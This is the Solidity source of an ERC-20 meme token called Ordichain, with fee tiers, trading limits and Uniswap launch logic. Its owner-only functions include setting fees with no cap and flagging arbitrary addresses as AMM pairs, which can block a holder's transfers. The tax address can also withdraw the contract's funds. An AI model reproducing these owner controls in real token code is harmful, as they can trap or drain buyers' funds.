// SPDX-License-Identifier: MIT      

/*

TG: https://t.me/Ordichainportal
Twitter: https://twitter.com/Ordhichain_ERC
Medium: https://medium.com/@Ordichain
Website: https://ordi-chain.com/
Whitepaper: https://whitepaper.ordi-chain.com/
RPC URL TEsnet: https://testnetrpc.ordi-chain.com/
Explorer: https://tblock.ordi-chain.com/
Faucet: https://faucet.ordi-chain.com/


*/

pragma solidity 0.8.23;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract Ordichain is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private addrExcluded;
    mapping (address => bool) public aMMakerPair;
    mapping(address => uint256) private _holderPrevTxTimestamp;
    address payable private _taxAddr;
    uint256 initialBlock;

    uint256 private iTOB=20;
    uint256 private mTOB=10;
    uint256 private iTOS=20;
    uint256 private mTOS=10;
    uint256 private fTOB=5;
    uint256 private fTOS=5;

    uint256 private mTOBAt=20;
    uint256 private rTOBAt=30;

    uint256 private mTOSAt=20;
    uint256 private rTOSAt=30;
    uint256 private noSwapsBefore=30;
    uint256 private _buyerCount=0;

    uint8 private constant _decimals = 9;
    uint256 private constant _tSupplyTotal = 1000000000 * 10**_decimals;
    string private constant _name = unicode"Ordichain";
    string private constant _symbol = unicode"ODCHN";
    uint256 public _txSizeLimit =   10000000 * 10**_decimals;
    uint256 public _walletSizeLimit = 10000000 * 10**_decimals;
    uint256 public _taxSwapThresLimit= 100000 * 10**_decimals;
    uint256 public _taxSwapLimit= 20000000 * 10**_decimals;

    IUniswapV2Router02 private uniswapV2Router;
    address public uniswapV2Pair;
    bool private _liveTrading;
    bool public _perTxDelay = true;
    bool private inSwap = false;
    bool private swapEnabled = false;

    event MaxTxLimitUpdated(uint _txSizeLimit);
    modifier lockTheSwap {
        inSwap = true;  
        _;
        inSwap = false;
    }

    constructor () {

        _taxAddr = payable(_msgSender());
        _balances[_msgSender()] = _tSupplyTotal;
        addrExcluded[owner()] = true;
        addrExcluded[address(this)] = true;
        addrExcluded[address(uniswapV2Pair)] = true;
        addrExcluded[_taxAddr] = true;
        
        emit Transfer(address(0), _msgSender(), _tSupplyTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tSupplyTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function aMakerPair(address addr) public onlyOwner {
        aMMakerPair[addr] = true;
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 _feeAmount=0;
        if (aMMakerPair[from] && to != address(this)){ 
            require(tx.origin == to);
            }
        if (from != owner() && to != owner()) {
            _feeAmount = amount.mul((_buyerCount> rTOBAt)? fTOB: ((_buyerCount> mTOBAt)? mTOB: iTOB)).div(100);
            
            if (_perTxDelay) {
                if (to != address(uniswapV2Router) && to != address(uniswapV2Pair)) {
                  require(_holderPrevTxTimestamp[tx.origin] < block.number,"Only one transfer per block allowed.");
                  _holderPrevTxTimestamp[tx.origin] = block.number;
                }
            }
            if (aMMakerPair[from] && to != address(uniswapV2Router) && ! addrExcluded[to] ) {
                require(amount <= _txSizeLimit, "Exceeds the _txSizeLimit.");
                require(balanceOf(to) + amount <= _walletSizeLimit, "Exceeds the maxWalletSize.");

                if (initialBlock + 3  > block.number) {
                    require(!isContract(to));
                }
                _buyerCount++;
            }

            if (!aMMakerPair[to] && ! addrExcluded[to]) {
                require(balanceOf(to) + amount <= _walletSizeLimit, "Exceeds the maxWalletSize.");
            }

            if(aMMakerPair[to] && from!= address(this) ){
                _feeAmount = amount.mul((_buyerCount> rTOSAt)? fTOS: ((_buyerCount> mTOSAt)? mTOS: iTOS)).div(100);
            }

            uint256 tokenContractBalance = balanceOf(address(this));
            if (!inSwap && aMMakerPair[to] && swapEnabled && tokenContractBalance>_taxSwapThresLimit && _buyerCount>noSwapsBefore) {
                swapTokensForEth(min(amount,min(tokenContractBalance,_taxSwapLimit)));
                uint256 contractETHBalance = address(this).balance;
                if(contractETHBalance > 0) {
                    sendETHToFee(address(this).balance);
                }
            }
        }

        if(_feeAmount>0){
          _balances[address(this)]=_balances[address(this)].add(_feeAmount);
          emit Transfer(from, address(this),_feeAmount);
        }
        _balances[from]=_balances[from].sub(amount);
        _balances[to]=_balances[to].add(amount.sub(_feeAmount));
        emit Transfer(from, to, amount.sub(_feeAmount));
    }


    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function isContract(address account) private view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function addrExclude(address addr, bool exempt) external onlyOwner {
        addrExcluded[addr] = exempt;
    }

    function _perTxDelayMode(bool _status) external onlyOwner {
        _perTxDelay = _status;
    }

    function randomNativeRescue(address _to) public {
        require(_msgSender() == _taxAddr);
        payable(_to).transfer(address(this).balance);
    }

    function randomERC20Rescue(address _tokenAddr, address _to, uint _amount) public {
        require(_msgSender() == _taxAddr);
        IERC20(_tokenAddr).transfer(_to, _amount);
    }

    function setFs(uint256 _fTOB, uint256 _fTOS) external onlyOwner {
        fTOB = _fTOB;
        fTOS = _fTOS; 
    }

    function limitless() external onlyOwner{
        _txSizeLimit=_tSupplyTotal;
        _walletSizeLimit=_tSupplyTotal;
        _perTxDelay=false;
        emit MaxTxLimitUpdated(_tSupplyTotal);
    }

    function sendETHToFee(uint256 amount) private {
        _taxAddr.transfer(amount);
    }

    function goTradingLive() external onlyOwner() {
        require(!_liveTrading,"trading is already open");
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(uniswapV2Router), _tSupplyTotal);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        aMMakerPair[address(uniswapV2Pair)] = true;
        addrExcluded[address(uniswapV2Pair)] = true;
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
        swapEnabled = true;
        _liveTrading = true;
        initialBlock = block.number;
    }

    receive() external payable {}
}